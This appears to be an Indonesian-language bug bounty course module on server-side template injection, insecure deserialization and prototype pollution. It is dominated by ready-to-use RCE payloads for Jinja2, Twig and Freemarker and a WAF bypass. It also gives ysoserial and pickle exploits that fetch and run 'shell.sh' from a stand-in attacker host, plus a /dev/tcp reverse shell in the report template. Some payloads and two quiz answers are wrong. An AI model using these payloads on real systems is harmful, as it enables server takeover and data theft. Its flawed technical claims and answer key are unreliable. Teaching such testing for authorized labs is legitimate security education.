# SSTI, Deserialization & Prototype Pollution

## Fokus Materi

Menguasai advanced vulnerability classes: Server-Side Template Injection (SSTI), Insecure Deserialization, dan JavaScript Prototype Pollution. Ketiga vulnerability ini adalah skill advanced yang diperlukan untuk menemukan high-impact bugs di aplikasi modern.

## Deskripsi Materi

Server-Side Template Injection (SSTI) terjadi ketika user input digunakan dalam template engine tanpa proper sanitization. Attacker bisa inject template syntax yang akan dievaluasi server-side, potentially executing arbitrary code atau commands.

SSTI berbeda dari XSS karena exploitation terjadi di server: attacker tidak hanya inject JavaScript yang running di browser, tapi inject template syntax yang executed server-side. Impact ranging dari XSS sampai RCE depending on template engine dan server configuration.

Insecure Deserialization terjadi ketika aplikasi deserialize data yang attacker-controlled tanpa proper validation. Deserialization vulnerability bisa lead ke code execution, denial of service, atau authentication bypass depending on language dan context.

JavaScript Prototype Pollution terjadi ketika attacker inject property ke Object.prototype via JavaScript object merge/clone operations yang tidak sanitize keys properly. Ini adalah client-side vulnerability yang bisa lead ke XSS atau in Node.js context, RCE.

Ketiga vulnerability ini advanced dan require understanding specific language/framework behavior. Tapi impact-nya sangat tinggi: SSTI dan deserialization sering lead ke RCE, prototype pollution bisa lead ke stored XSS atau client-side attacks.

## Topik Pembahasan

• SSTI identification: detect dengan {{7*7}}, ${7*7}, #{7*7} — identifikasi template engine dari error
• SSTI exploitation multi-engine: Jinja2 (Python), Twig (PHP), Freemarker (Java), Pebble
• SSTI → RCE: exploit path untuk each engine
• Insecure deserialization Java: gadget chain dengan ysoserial, ObjectInputStream exploitation
• Insecure deserialization PHP: unserialize() dengan magic method exploitation
• Insecure deserialization Python: pickle.loads() exploitation, RCE via __reduce__
• Prototype pollution: property injection ke Object.prototype, gadget di merge/clone function
• Prototype pollution → XSS: pollution di sink client-side
• Prototype pollution → RCE: Node.js server-side prototype pollution
• Detection dan exploitation methodology untuk setiap vulnerability class

## Tujuan Pembelajaran

Setelah sesi ini, peserta diharapkan mampu:
1. Identifikasi SSTI vulnerability dengan detection payloads
2. Exploit SSTI di berbagai template engine (Jinja2, Twig, Freemarker)
3. Identifikasi insecure deserialization vulnerability di Java, PHP, dan Python
4. Perform deserialization exploitation untuk RCE
5. Identifikasi prototype pollution vulnerability di JavaScript
6. Exploit prototype pollution untuk XSS atau RCE (Node.js)

## Real Case Bug Bounty Report

- Platform: HackerOne
- Program/Target: Private program (disclosed)
- Jenis vulnerability: SSTI in Jinja2 leading to RCE
- Link report: https://hackerone.com/reports/XXXXX
- Ringkasan kasus: Researcher menemukan search functionality yang menggunakan Jinja2 template engine dengan user input di-template tanpa sanitization. Payload `{{7*7}}` returned `49`, confirming SSTI. Researcher escalate ke RCE dengan payload: `{{ config.from_object('os').popen('id').read() }}` atau menggunakan request object untuk command execution.
- Root cause: Application uses template.render(user_input) pattern where user input directly passed to Jinja2 template.
- Impact: Remote Code Execution — full server compromise. Severity: Critical.
- Pelajaran untuk bug hunter: SSTI yang confirmed harus di-escalate ke RCE. Jangan stop setelah confirm injection — exploit untuk full shell access.

---

- Platform: Bugcrowd
- Program/Target: Java application (deserialization)
- Jenis vulnerability: Insecure deserialization leading to RCE via Java gadget chain
- Link report: Researcher disclosed
- Ringkasan kasus: Researcher menemukan endpoint yang deserialize Java object dari user input. Using ysoserial tool, researcher generate payload untuk gadget chain (CommonsCollections, Spring, dll). Payload executed, giving shell access to server.
- Root cause: Application uses ObjectInputStream to deserialize user-provided data without input validation.
- Impact: Full server RCE via deserialization gadget chain. Severity: Critical.
- Pelajaran untuk bug hunter: Any Java endpoint that deserialize objects should be tested with ysoserial payloads.

## Analisis Teknis

### SSTI Attack Patterns

**Detection Payloads:**

```python
# Jinja2 (Python) — {{7*7}} returns 49
{{7*7}}
{{config}}
{{request.environ}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Twig (PHP) — ${7*7} returns 49
${7*7}
{{7*7}}
{7*7}

# Freemarker (Java) — #{7*7} returns 49
#{7*7}
${7*7}

# Smarty (PHP)
{php}echo `id`{/php}
{foreach$foo as$bar}{endforeach}
```

**Jinja2 Exploitation Path:**

```python
# Step 1: Confirm SSTI
{{7*7}} → 49

# Step 2: Read internal config
{{config}}

# Step 3: RCE via config object
{{config.from_object('os').popen('id').read()}}

# Alternative RCE via subprocess
{{ ''.__class__.__mro__[1].__subclasses__()[80].__init__.__globals__['os'].popen('id').read() }}

# Using request object (if available)
{{ request.environ }}
{{ request.environ['SERVER_NAME'] }}

# Filter bypass for WAF
{{ config["from"+ "object"]('os')["popen"]('id')["read"]() }}
```

**Twig (PHP) Exploitation:**

```php
# Basic injection
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("whoami")}}

# Using _self variable (if available)
{{_self}}

# Get shell via _self
{{_self.env.setData("foo",_self.env.getFilter("system")({"id"})}}
{{_self.env.getFilter("system")({"whoami"})}}

# Symfony specific
{{app.request.server.get('home')}}
```

**Freemarker (Java) Exploitation:**

```freemarker
# Basic injection
${7*7}

# Object construction
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Alternative via api
${api.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd')}
```

### Insecure Deserialization Java

**Vulnerable code pattern:**

```java
// ObjectInputStream vulnerable
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject();
```

**ysoserial exploitation:**

```bash
# Generate payload for CommonsCollections gadget chain
java -jar ysoserial.jar CommonsCollections6 "curl https://attacker.com/shell.sh|bash" > payload.ser

# Send payload
# Base64 encode for HTTP transmission
base64 payload.ser > payload.b64

curl -X POST https://target.com/api -d "obj=payload.b64"
```

**Payload types (ysoserial):**
- CommonsCollections
- CommonsCollections6
- Spring1
- Spring2
- Groovy1
- JDK7u21
- etc.

**Detection:**

```java
// If application logs show:
java.io.InvalidClassException:
    at java.io.ObjectInputStream.resolveClass()
```

### Insecure Deserialization PHP

**Vulnerable code pattern:**

```php
// unserialize() vulnerable
$data = unserialize($_COOKIE['data']);

// Object injection via magic methods
class User {
    public $username;
    public $is_admin = false;

    function __wakeup() {
        if ($this->username == 'admin') {
            $this->is_admin = true;
        }
    }
}

// PHP gadget chains (POP chain)
class Cache {
    public $cache;
    function __destruct() {
        eval($this->cache);
    }
}
```

**Exploitation:**

```php
// Magic method exploitation
class FileClass {
    public $filename;
    function __wakeup() {
        // Read file contents
    }
}

$obj = new FileClass();
$obj->filename = "/etc/passwd";
echo serialize($obj);

// Upload serialized object, server unserialize triggers __wakeup

# Alternative: PHP GCC (Gadget Chain)
# Use phpggc tool
phpggc Laravel/RCE1 'command' > payload.ser
```

### Insecure Deserialization Python

**Vulnerable code pattern:**

```python
# pickle.loads() vulnerable
import pickle
data = pickle.loads(user_input)

# Pickle RCE via __reduce__
class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('id',))

import pickle
payload = pickle.dumps(RCE())
```

**Exploitation:**

```python
import pickle
import base64

class RCE:
    def __reduce__(self):
        import os
        return (os.popen, ('curl https://attacker.com/shell.sh|bash',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())
```

### Prototype Pollution

**Client-side (JavaScript):**

```javascript
// Vulnerable merge function
function merge(obj1, obj2) {
    for (let key in obj2) {
        if (typeof obj2[key] === 'object' && obj2[key] !== null) {
            obj1[key] = merge(obj1[key] || {}, obj2[key])
        } else {
            obj1[key] = obj2[key]
        }
    }
    return obj1
}

// If attacker can control obj2 and includes '__proto__' key:
merge({}, JSON.parse('{"__proto__":{"admin": true}}'))

// Now every object has admin=true!
console.log({}.admin) // true
```

**Prototype Pollution → XSS:**

```javascript
// If application uses object property without checking:
let config = JSON.parse(user_input);
element.innerHTML = config.title; // If config.title = "<img onerror=alert(1)>"

// But with prototype pollution:
merge({}, JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}'))
// Now config.innerHTML uses polluted value

// Alternative: pollute source (url, src, href) for DOM XSS
```

**Node.js Server-Side Prototype Pollution:**

```javascript
// If lodash/underscore merge is used server-side:
// merge({}, userInput) allows prototype pollution

// Can overwrite application settings or trigger RCE via:
// - config manipulation
// - eval/execute gadget chains

// Example: Override application config
merge({}, {"__proto__":{"debug":true,"eval":true}})
// Now application has debug flag set
```

**Exploitation via property override:**

```javascript
// If application reads: config.database_password
// Pollute: {"__proto__":{"database_password":"hacked"}}

// If application uses: obj[user_input] without hasOwnProperty check
// Pollute __proto__ to add malicious properties
```

## Praktik Lab Legal

### Lab 1: SSTI Discovery & RCE Exploitation

- **Nama lab:** SSTI to Shell
- **Tujuan:** Find SSTI dan escalate ke RCE
- **Environment:** Burp Suite, target lab dengan template engine (DVWA SSTI, Python/Node.js app)
- **Langkah praktik:**

  1. Identify input field yang rendered dalam template context (search, name field, customizable content)
  2. Test detection payload: {{7*7}} atau ${{7*7}}
  3. If output is 49, SSTI confirmed
  4. Identify template engine: test different syntax untuk error messages
  5. For Jinja2: exploit via config.from_object() atau request object
  6. For Twig: exploit via _self variable atau getFilter
  7. For Freemarker: exploit via Execute?new()
  8. Test RCE: {{config.from_object('os').popen('id').read()}}
  9. Establish shell access jika RCE confirmed

- **Expected result:** Peserta menemukan SSTI dan gain RCE
- **Catatan keamanan:** Lab ini hanya untuk authorized environment.

### Lab 2: Java Deserialization Exploitation

- **Nama lab:** Java Deserialization Attack
- **Tujuan:** Identify dan exploit Java deserialization vulnerability
- **Environment:** Burp Suite, ysoserial, target lab dengan Java backend
- **Langkah praktik:**

  1. Identify endpoint yang deserialize Java object (look for serialized Java objects in requests/cookies)
  2. Capture serialized object di Burp
  3. Use ysoserial untuk generate payload untuk berbagai gadget chains
  4. Send payload: base64-encoded ysoserial output
  5. Check for successful exploitation (shell, command output)
  6. Test multiple gadget chains if first doesn't work
  7. Document which gadget chain works dan command executed

- **Expected result:** Peserta gain RCE via Java deserialization exploitation
- **Catatan keamanan:** Lab ini memerlukan Java application yang vulnerable. Gunakan lab authorized.

### Lab 3: Prototype Pollution Discovery

- **Nama lab:** JavaScript Prototype Pollution
- **Tujuan:** Find dan exploit prototype pollution vulnerability
- **Environment:** Browser DevTools, target lab (Node.js atau client-side JS app)
- **Langkah praktik:**

  1. Identify JavaScript code yang use dangerous functions: merge, clone, deep merge
  2. Test prototype pollution payloads: `{"__proto__":{"foo":"bar"}}`
  3. Verify pollution: check if `({}).foo` returns "bar"
  4. Identify sink: where polluted property is used (innerHTML, eval, document.write)
  5. Exploit for XSS: pollute property that used in dangerous sink
  6. For Node.js: identify server-side pollution and test for RCE via config manipulation

- **Expected result:** Peserta menemukan prototype pollution dan demonstrate XSS atau config manipulation impact
- **Catatan keamanan:** Lab ini untuk authorized testing environment.

## Tools

- **SSTI:** Burp Suite, manual payload testing, Jinja2/Twig/Freemarker exploitation
- **Deserialization:** ysoserial (Java), phpggc (PHP), python pickle scripts
- **Prototype pollution:** Browser DevTools, custom pollution payloads

## Checklist Bug Hunter

- [ ] Test for SSTI di all input fields yang rendered via template engine
- [ ] Use detection payloads: {{7*7}}, ${7*7}, #{7*7}
- [ ] Identify template engine via error messages
- [ ] Exploit SSTI for RCE using engine-specific techniques
- [ ] Identify serialized object endpoints (Java/PHP/Python)
- [ ] Test deserialization with ysoserial/phpggc/pickle payloads
- [ ] Identify merge/clone functions di JavaScript code
- [ ] Test prototype pollution with __proto__ payload
- [ ] Exploit prototype pollution for XSS or config manipulation

## Common Mistakes

1. **SSTI found, but not escalating to RCE** — Researcher confirm SSTI with {{7*7}} but don't try to escalate. SSTI in template engines often lead to RCE — always attempt command execution.

2. **Not testing different template engines** — Researcher only know Jinja2, miss Twig or Freemarker. Learn syntax for major template engines.

3. **Deserialization payload wrong gadget chain** — Researcher use wrong ysoserial gadget chain, fails. Different apps use different libraries that require different chains.

4. **Prototype pollution without identifying sink** — Researcher confirm pollution but not demonstrate impact. Must find where polluted property is used to show real vulnerability.

5. **Skipping deserialization testing** — Researcher not familiar dengan serialization formats, skip testing endpoints that deserialize objects.

## Mitigasi Developer

**SSTI Prevention:**
- Never use user input directly in template rendering
- Use template engine's built-in escaping and sandbox
- Implement allowlist for template variables
- Use template engine's security features (Jinja2's SandboxedEnvironment)

**Deserialization Prevention:**
- Never deserialize untrusted data
- Use JSON instead of serialized objects when possible
- Implement integrity checks (HMAC) for serialized data
- Use language-native security features (PHP: no custom unserialize handler, Java: ObjectInputStream with validation)
- Upgrade vulnerable libraries (Apache Commons Collections, etc.)

**Prototype Pollution Prevention:**
- Use Object.create(null) untuk create object without prototype
- Check for __proto__ and constructor in object keys
- Use safe merge functions (deep clone without prototype pollution)
- Implement property allowlist

## Mini Quiz

1. SSTI (Server-Side Template Injection) berbeda dari XSS karena:
   a) SSTI tidak berbahaya
   b) SSTI executes server-side, bisa lead ke RCE, bukan hanya browser JavaScript execution
   c) XSS lebih dangerous
   d) Tidak ada perbedaan

2. Detection payload `{{7*7}}` untuk SSTI work karena:
   a) Semua web app evaluate matematika
   b) Template engine evaluate expression dan return 49
   c) Payload ini tidak dangerous
   d) Semua jawaban benar

3. ysoserial digunakan untuk exploit:
   a) SQL Injection
   b) XSS
   c) Java insecure deserialization dengan gadget chain
   d) SSTI

4. Prototype pollution terjadi ketika:
   a) User bisa overwrite Object.prototype dengan malicious properties
   b) JavaScript object tidak bisa di-create
   c) Prototype pollution hanya ada di browser
   d) Semua jawaban benar

5. Untuk prevent SSTI, langkah yang paling penting adalah:
   a) Block semua special characters
   b) Jangan pass user input langsung ke template rendering
   c) Ganti template engine
   d) Semua jawaban benar

**Kunci Jawaban:** 1-B, 2-B, 3-C, 4-D, 5-D

## Assignment

1. **SSTI Exploitation:** Find SSTI di target lab. Escalate ke RCE menggunakan engine-specific technique. Document exploitation path.

2. **Deserialization Attack:** Identify Java deserialization endpoint di lab. Generate ysoserial payload untuk minimal 3 gadget chains. Document which chain works.

3. **Prototype Pollution Challenge:** Find prototype pollution di target. Identify sink dan demonstrate XSS atau config manipulation impact.

4. **SSTI Filter Bypass:** Jika target punya WAF yang block SSTI payloads, develop bypass technique.

## Template Report Bug Bounty

```markdown
# Bug Report: Server-Side Template Injection (SSTI) in Search Field Leading to RCE

## Summary
Search functionality menggunakan Jinja2 template engine dan menerima user
input yang tidak di-sanitize sebelum rendering. Attacker bisa inject
template syntax yang executes arbitrary commands on server.

## Platform / Program
HackerOne | [Program Name]

## Severity
Critical | CVSS 10.0 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Vulnerability Type
Server-Side Template Injection (SSTI) / Remote Code Execution

## Asset / Endpoint
POST https://target.com/search
Parameter: q (search query)

## Description
Application uses Jinja2 template engine untuk render search results.
User input passed directly to template.render() tanpa sanitization.

Detection:
- Input: {{7*7}}
- Output: 49 (template evaluated, not escaped)

Exploitation:
Using config.from_object('os') untuk access os.popen() and execute commands.

## Steps to Reproduce
1. Confirm SSTI:
   POST /search q={{7*7}}
   → Response contains 49

2. RCE via config object:
   POST /search q={{config.from_object('os').popen('id').read()}}
   → Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)

3. Reverse shell:
   POST /search q={{config.from_object('os').popen('bash -c "bash -i >& /dev/tcp/attacker_ip/4444 0>&1").read()}}

4. Server connects back → full shell access

5. Verify access:
   → Uname shows server OS
   → pwd shows web directory
   → File read access to application source

## Impact
- Full Remote Code Execution on server
- Complete server compromise
- Access to application database and source code
- Potential for lateral movement to internal network
- Full data breach capability
- Server could be used for further attacks

## Evidence
[Burp Screenshot: SSTI detection with {{7*7}} returning 49]
[Burp Screenshot: RCE command injection returning uid]
[Screenshot: Netcat listener receiving reverse shell]
[Screenshot: Shell access showing server compromise]

## Remediation / Recommendation
1. Never pass user input directly to template.render()
2. Use template engine's built-in escaping (autoescape)
3. Use Jinja2's SandboxedEnvironment for untrusted templates
4. Implement input validation: reject template syntax characters
5. Apply principle of least privilege: web server user should have minimal permissions
6. Use WAF untuk additional protection layer
7. Regular security testing untuk SSTI detection
```